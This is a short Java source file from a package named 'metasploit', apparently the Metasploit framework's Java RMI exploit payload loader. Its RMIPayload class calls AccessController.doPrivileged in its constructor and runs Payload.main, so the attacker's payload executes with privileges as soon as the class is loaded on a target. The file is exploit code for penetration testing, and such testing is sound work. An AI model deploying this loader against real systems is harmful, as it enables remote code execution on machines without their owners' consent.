package metasploit;

import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class RMIPayload implements PrivilegedExceptionAction {
	
	public RMIPayload() throws Exception {
		AccessController.doPrivileged(this);
	}

	public Object run() throws Exception {
		Payload.main(null);
		return null;
	}
}
